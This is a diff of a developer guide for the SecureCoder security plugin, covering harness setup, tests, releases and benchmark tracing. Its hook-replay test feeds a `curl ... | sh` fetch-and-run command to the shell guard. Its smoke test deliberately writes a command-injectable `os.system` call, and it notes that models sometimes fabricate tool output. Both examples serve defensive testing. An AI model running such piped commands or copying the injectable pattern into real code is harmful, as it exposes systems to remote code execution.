@@ -1,103 +1,223 @@
-# Running & testing the plugin
+# Developing SecureCoder
 
-This doc covers loading the plugin from a checkout and safely exercising its hooks before trusting them in a real project. For install-as-a-user instructions, see the main [README](../README.md).
+This guide covers working on the plugin from a checkout: running it in each harness, testing, releasing, and recording benchmark traces. For installation as a user, see the [README](README.md).
+
+## Architecture in one screen
+
+All harness adapters are thin. The shared behavior lives in `mcp-server/lib/`:
+
+| Module | Responsibility |
+| --- | --- |
+| `analyze.js`, `syntax.js`, `external.js`, `codeql.js`, `sarif.js` | Guardian pipeline (ported from the Kotlin engine) |
+| `feedback.js`, `retry.js`, `enricher.js` | Remediation guidance, retry policy, prompt enrichment |
+| `settings.js` | Settings schema, scopes, precedence, validation, trust boundary, atomic writes |
+| `report.js` | Dashboard, doctor, key list, and findings rendering, identical everywhere |
+| `hook-io.js`, `hooks.js`, `shell-guard.js` | Hook payload parsing per harness, response dialects, shared hook logic |
+| `doctor.js`, `severity.js`, `version.js` | Analyzer detection, severity scale, single version source |
+
+Entrypoints: `mcp-server/index.js` (MCP stdio server), `hooks/securecoder-hook.js` (Claude Code, Codex, and Cursor hooks), `bin/securecoder` (CLI, the only write path for settings), and `opencode/index.js` (OpenCode plugin).
+
+When changing guardian behavior (query packs, crash recovery, feedback hints), keep it in sync with the Kotlin sources in the SecureCoder engine (`guardian/codeql`, `engine/.../workflow/FeedbackBuilder.kt`).
 
 ## Running from a checkout
 
-`--plugin-dir` loads a plugin for the current session only — nothing is installed or persisted — which makes it the right way to run this repo straight from source:
+Every harness can load this repository in place. Replace `$SC` with the checkout path:
 
 ```bash
-cd /path/to/some/project   # the project you want SecureCoder active in
-claude --plugin-dir /path/to/securecoder-claude-plugin
+SC=/path/to/securecoder-claude-plugin
 ```
 
-- `--plugin-dir` is repeatable if you want to load it alongside other local plugins: `--plugin-dir ../securecoder-claude-plugin --plugin-dir ../other-plugin`.
-- It also accepts a `.zip`, and there's a `--plugin-url <url>` variant for loading a packaged plugin from a URL.
-- Before shipping changes, lint the manifest: `claude plugin validate .` (add `--strict` to fail on warnings too — useful in CI).
-- Once installed for real (via a marketplace), manage it with `claude plugin list`, `claude plugin details securecoder`, `claude plugin disable securecoder` / `claude plugin enable securecoder`.
+### Claude Code
 
-On first run in a new project, Claude Code will ask you to trust the directory and to approve the `securecoder-analysis` MCP server the first time it's used — that's expected, not a bug.
+`--plugin-dir` loads the plugin for one session without installing it:
+
+```bash
+cd /path/to/some/project
+claude --plugin-dir "$SC"
+```
+
+Verify with `/securecoder doctor`. After editing hooks, agents, or the MCP server, run
+`/reload-plugins`; skill edits apply immediately. To install it for every session instead,
+`/plugin marketplace add "$SC"` followed by `/plugin install securecoder@securecoder`.
+
+### Codex
+
+Codex installs by *copying* the marketplace directory into `~/.codex/plugins/cache/`, including
+untracked and gitignored files. Stage a clean copy first, then install from it:
+
+```bash
+rsync -a --exclude='.git/' --exclude='.venv/' --exclude='.env' --exclude='docs/' \
+      --exclude='node_modules/' --exclude='traces/' --exclude='.DS_Store' \
+      "$SC/" ~/.local/share/securecoder-stage/
+
+codex plugin marketplace add ~/.local/share/securecoder-stage
+codex plugin add securecoder@securecoder     # <plugin>@<marketplace name>, both are "securecoder"
+codex plugin list                            # expect: installed, enabled
+codex mcp list                               # expect: securecoder-analysis, enabled
+```
+
+Then start `codex` in a test project and approve the hooks under `/hooks`; Codex requires hook
+trust before they run. The settings skill is `$securecoder:securecoder`. Re-staging after an edit
+needs `codex plugin remove securecoder` and a fresh `codex plugin add`, since the cache is a copy.
+
+Codex starts plugin MCP servers with the working directory inside the plugin cache, which is why
+the portable `mcp.json` uses a plugin-relative `cwd` and the server derives the project from MCP
+roots, harness environment variables, or absolute file paths.
+
+### Cursor
+
+Cursor discovers local plugins under `~/.cursor/plugins/local/`. A symlink keeps it pointed at
+your working tree (no copy, so nothing gitignored gets duplicated):
+
+```bash
+mkdir -p ~/.cursor/plugins/local
+ln -s "$SC" ~/.cursor/plugins/local/securecoder
+```
+
+Restart Cursor, then check **Customize → Plugins** for SecureCoder. Cursor reads either
+`.cursor-plugin/plugin.json` (skills, agents, hooks, MCP) or the root `plugin.json`
+(skills and MCP only) and auto-detects which. If hooks and the remediator agent appear, it chose
+the Cursor manifest; if only skills and MCP tools appear, it chose the portable one.
+
+### VS Code (GitHub Copilot)
+
+VS Code registers local plugins through a setting rather than a folder. Add to your user
+`settings.json` (Command Palette → **Preferences: Open User Settings (JSON)**):
+
+```json
+{
+  "chat.pluginLocations": {
+    "/path/to/securecoder-claude-plugin": true
+  }
+}
+```
+
+Reload the window, then confirm under **Extensions → Agent Plugins - Installed**, and check that
+`secure-codegen` shows up in **Chat: Configure Skills**. VS Code reads the root `plugin.json`,
+so it gets the skills and the MCP tools. It looks for plugin hooks at
+`com.github.copilot/hooks/hooks.json`, which this plugin does not ship, so the post-edit scan
+does not run there yet; use the `securecoder_analyze` tool or the CLI instead.
+
+### OpenCode
+
+OpenCode loads JavaScript plugins from a plugins folder. Write a loader that re-exports the
+adapter from your checkout (global for every project, or `.opencode/plugins/` in one project):
+
+```bash
+mkdir -p ~/.config/opencode/plugins
+printf 'export * from "%s";\nexport { default } from "%s";\n' \
+  "$SC/opencode/index.js" "$SC/opencode/index.js" \
+  > ~/.config/opencode/plugins/securecoder.js
+
+opencode debug config | grep -A3 securecoder-analysis   # MCP registered
+opencode mcp list                                       # expect: connected
+opencode debug agent securecoder-remediator             # subagent registered
+```
+
+`/securecoder` and `/secure-codegen` are then available as commands, and
+`@securecoder-remediator` as a subagent. Edits to the checkout take effect on the next start.
+
+### Any MCP client
+
+`node mcp-server/index.js` speaks MCP over stdio. Pass `project_root` or absolute paths when the
+client doesn't advertise MCP roots.
+
+## Smoke test in any harness
+
+In a scratch git repository, ask the agent to write this file verbatim, telling it not to fix the
+bug (otherwise a good model writes the safe version and nothing triggers):
+
+```python
+import os
+
+def archive(target_dir):
+    os.system(f"tar czf backup.tgz {target_dir}")
+```
+
+Expected: bandit `B605` (and semgrep, if installed) come back as HIGH, in the agent's context on
+harnesses with hooks. Then check the rest:
+
+```bash
+node "$SC/bin/securecoder" status      # dashboard: settings, sources, installed analyzers
+node "$SC/bin/securecoder" doctor      # analyzer availability with install hints
+node "$SC/bin/securecoder" scan app.py # exit code 1 when findings exist
+```
+
+Ask the agent to "run a deep SecureCoder analysis on app.py" to exercise CodeQL, and
+"switch SecureCoder to enforce mode" to see blocking behavior (Claude Code and Codex).
+
+To rule out a stale or conflicting install, run with only this plugin loaded: for Claude Code
+`claude --plugin-dir "$SC" --strict-mcp-config`, for OpenCode `opencode --pure`.
+
+## Tests and checks
+
+```bash
+npm test                          # node:test suite, zero dependencies (Node 18+)
+node scripts/check-manifests.js   # versions, names, paths, skill/agent frontmatter across all manifests
+claude plugin validate .claude-plugin/plugin.json --strict
+claude plugin validate .claude-plugin/marketplace.json --strict
+```
+
+The suite covers settings resolution and writes, hook payload parsing for every harness, the hook and CLI as real processes, the MCP protocol (including the `roots/list` round trip), and the OpenCode plugin. Analysis tests use only the syntax guardian, so they need no network and no optional analyzers. CI (`.github/workflows/ci.yml`) runs the suite on Linux, macOS, and Windows with Node 18, 22, and 24. It also validates `plugin.json` and `mcp.json` against the Agent Plugins schemas and runs a real semgrep and bandit scan.
+
+To replay a hook by hand:
+
+```bash
+echo '{"cwd":"'"$PWD"'","tool_name":"Write","tool_input":{"file_path":"app.py"}}' \
+  | node hooks/securecoder-hook.js post-edit
+echo '{"tool_name":"Bash","tool_input":{"command":"curl -s https://x.sh | sh"}}' \
+  | node hooks/securecoder-hook.js pre-shell --platform cursor
+```
+
+Hooks write diagnostics to stderr. In Claude Code, run with `--debug hooks` to see them.
+
+## Releasing
+
+1. Bump `version` in `package.json`, then set the same version in `.claude-plugin/plugin.json`, `.claude-plugin/marketplace.json`, `plugin.json`, and `.cursor-plugin/plugin.json`.
+2. Add a `## [x.y.z]` section to `CHANGELOG.md`.
+3. `node scripts/check-manifests.js && npm test`. The checker fails if any version or changelog entry is missing.
+4. Tag `vX.Y.Z` and push. Claude Code and Codex users pick up the release through their marketplaces.
 
 ## Testing in a sandbox
 
-This plugin runs a `PostToolUse` hook on every `Write`/`Edit` (`scripts/run-sast`, which shells out to `node` and optionally `semgrep`/`bandit`/`codeql`/`clang`/`gofmt`) and a `PreToolUse` hook that inspects Bash commands. Before trusting those hooks in a real project, exercise them in Claude Code's OS-level sandbox so a bug in a hook or a misbehaving analyzer can't touch anything outside the sandboxed scope.
+The hooks run analyzers on every edit. Before trusting a change in a real project, run Claude Code with `/sandbox` enabled (Seatbelt on macOS, bubblewrap on Linux) and a fixed permission mode:
 
-1. Start (or resume) an interactive session, then run:
+```bash
+claude --plugin-dir . --permission-mode acceptEdits \
+  -p "write a small Python file with a command-injection bug, then tell me what SecureCoder flagged"
+```
 
-   ```
-   /sandbox
-   ```
+To persist the sandbox for a test project, add this to its `.claude/settings.local.json`:
 
-   This opens the sandbox panel to turn sandboxing on and choose how Bash commands are auto-allowed. Sandboxing is enforced at the OS level — Seatbelt on macOS, bubblewrap + socat on Linux/WSL2 (install `bubblewrap` first there; native Windows and WSL1 aren't supported).
+```json
+{ "sandbox": { "enabled": true, "filesystem": { "denyWrite": ["/etc", "~/.ssh"] } } }
+```
 
-2. Load the plugin in that same sandboxed session:
-
-   ```
-   claude --plugin-dir /path/to/securecoder-claude-plugin
-   ```
-
-   (or enable sandboxing first, then load the plugin — either order works, `/sandbox` is a session setting.)
-
-3. Persist the sandbox config for repeat test runs instead of re-toggling it each time, by adding to `.claude/settings.local.json` in the *test* project (not this plugin repo):
-
-   ```json
-   {
-     "sandbox": {
-       "enabled": true,
-       "network": { "allowedDomains": ["registry.npmjs.org"] },
-       "filesystem": { "denyWrite": ["/etc", "~/.ssh"] }
-     }
-   }
-   ```
-
-   Sandboxed Bash still gets write access to the project directory and a session temp dir, and read access to the filesystem by default — the `denyWrite`/`denyRead` lists narrow that further. Network access is denied by default; a domain is prompted for on first access and then auto-allowed for the rest of the session, or you can pre-allow it as above (needed if `codeql pack download` or `pip`/`npm` installs run mid-session).
-
-4. Drive the actual test: ask Claude to write a file with an obvious issue (e.g. "write a Python function that builds a SQL query with string formatting from a `user_id` parameter") and confirm the `PostToolUse` hook fires and findings show up in context, then ask it to run a deep scan (`securecoder_analyze` with `deep: true`) to exercise the CodeQL path.
-
-5. For a completely non-interactive check (e.g. in CI), pair the sandbox with a fixed permission mode so nothing blocks on a prompt:
-
-   ```bash
-   claude --plugin-dir . --permission-mode acceptEdits -p "write a small file with a command-injection bug, then tell me what SecureCoder flagged"
-   ```
-
-   `--permission-mode` is a separate axis from sandboxing — sandboxing bounds *what* a tool can touch once it runs, permission mode decides *whether* it runs without asking. Useful modes here: `acceptEdits` (auto-accept file edits, still prompts for anything else) or `plan` (nothing executes, good for a dry read of the skill/hook wiring). Avoid `bypassPermissions` / `--dangerously-skip-permissions` for this — that defeats the point of testing hook behavior safely, and Claude Code's own docs restrict it to network-isolated sandboxes.
-
-If a hook misbehaves (e.g. `scripts/run-sast` hangs or an analyzer tries to write outside the project), the sandbox is what stops it from being a host-level problem instead of a test failure — check `claude plugin details securecoder` and run with `--debug hooks` to see the hook's stderr for diagnosis.
+Avoid `--dangerously-skip-permissions` here; it defeats the point of testing hook behavior safely.
 
 ## Recording traces for benchmarking
 
-The MCP server's normal response to a tool call is a flattened, human-readable text block — fine for the agent, lossy if you're trying to score runs afterward (e.g. comparing plugin-on vs. plugin-off on a benchmark). Set `SECURECODER_TRACE_LOG` to a file path and the server also appends the full structured result — violations, retry verdict, resolved/introduced/persisting counts — as one JSON line per `securecoder_analyze`/`securecoder_enrich_prompt`/`securecoder_reset_session` call. It's off by default and never affects the MCP response itself.
-
-Point it at a per-task path so each `claude -p` invocation gets its own trace file, alongside Claude Code's own transcript for that session (`~/.claude/projects/<project-slug>/<session-uuid>.jsonl`):
+Set `SECURECODER_TRACE_LOG` (or `trace_log` in user config) to a file path. The MCP server then appends the full structured result of every `securecoder_analyze`, `securecoder_enrich_prompt`, and `securecoder_reset_session` call as one JSON line: violations, retry verdict, and resolved/introduced/persisting counts. It is off by default and doesn't change the MCP response.
 
 ```bash
 SECURECODER_TRACE_LOG="traces/${task_id}.jsonl" claude -p "$task_prompt"
 ```
 
-At analysis time, join the two: the transcript gives you the conversation (including the tool calls/results as the agent saw them), the trace file gives you the final structured score for that task.
-
-To get from a pile of `(transcript, trace)` pairs to something browsable, `scripts/docent_ingest.py` converts one pair into a [Docent](https://docent.transluce.org) `AgentRun` and uploads it — the transcript becomes the message history (Claude Code's tool_use/tool_result blocks get reshaped into Docent's `ToolCall`/`ToolMessage`), and the last `securecoder_analyze` record in the trace file becomes `AgentRun.metadata.scores` (final verdict, attempt count, remaining violations), with the full trace kept under `metadata.trace_log`.
-
-Setup (once): a `.venv/` + `requirements.txt` (`docent-python`) live in the repo root — `.venv/` is gitignored, install with `python3 -m venv .venv && ./.venv/bin/python -m pip install -r requirements.txt`. Put your key in a gitignored `.env` as `DOCENT_API_KEY=...` (get one at <https://docent.transluce.org/settings/api-keys>), then `set -a && source .env && set +a` before running the script.
+`dev/benchmark/docent_ingest.py` pairs one Claude Code transcript (`~/.claude/projects/<slug>/<session>.jsonl`) with one trace file and uploads the pair to [Docent](https://docent.transluce.org) as an `AgentRun`. The last analysis record becomes `metadata.scores`.
 
 ```bash
-./.venv/bin/python scripts/docent_ingest.py \
-  --transcript ~/.claude/projects/<project-slug>/<session-uuid>.jsonl \
+python3 -m venv .venv && ./.venv/bin/python -m pip install -r dev/benchmark/requirements.txt
+set -a && source .env && set +a     # DOCENT_API_KEY=...
+./.venv/bin/python dev/benchmark/docent_ingest.py \
+  --transcript ~/.claude/projects/<slug>/<session>.jsonl \
   --trace traces/demo-task-001.jsonl \
-  --task-id demo-task-001 \
-  --variant securecoder \
-  --collection securecoder-docent-demo
+  --task-id demo-task-001 --variant securecoder --collection securecoder-docent-demo
 ```
 
-It prints the collection's dashboard URL on success (example: [a demo run](https://docent.transluce.org/dashboard/e0eda8b1-c431-4c8b-985b-eea3121f6be9/agent_run/2a109ac7-eb88-4d56-841d-c0f4a4fd9a40)).
-
-One caveat found while testing: a plain `claude -p --plugin-dir .` can silently make the plugin's MCP tools invisible to the agent if many other MCP servers are also connected globally (tool discovery falls back to a deferred lookup mode that headless `-p` doesn't support) — the model then either gives up or, worse, fabricates a plausible-looking response without ever calling the tool. Scope the MCP surface down explicitly to avoid this:
+Headless caveat: with many globally configured MCP servers, `claude -p` can defer tool discovery so the plugin's tools never reach the model. Scope the MCP surface explicitly and pre-allow the tools, which use plugin-scoped names:
 
 ```bash
-claude --plugin-dir . --strict-mcp-config --mcp-config mcp-only-securecoder.json \
-  --permission-mode acceptEdits \
-  --allowedTools "Bash Write Edit Read mcp__securecoder-analysis__securecoder_analyze mcp__securecoder-analysis__securecoder_status mcp__securecoder-analysis__securecoder_enrich_prompt mcp__securecoder-analysis__securecoder_reset_session" \
+claude --plugin-dir . --permission-mode acceptEdits \
+  --allowedTools "Bash Write Edit Read mcp__plugin_securecoder_securecoder-analysis__securecoder_analyze mcp__plugin_securecoder_securecoder-analysis__securecoder_enrich_prompt" \
   -p "$task_prompt"
 ```
-
-where `mcp-only-securecoder.json` registers just `securecoder-analysis` (same shape as this repo's `.mcp.json`). `--strict-mcp-config` drops the plugin's own MCP registration too, so it must be re-declared here. `--allowedTools` is required because `--permission-mode acceptEdits` only covers Write/Edit, not first-use MCP tool permission — without it the call is silently denied in non-interactive mode.
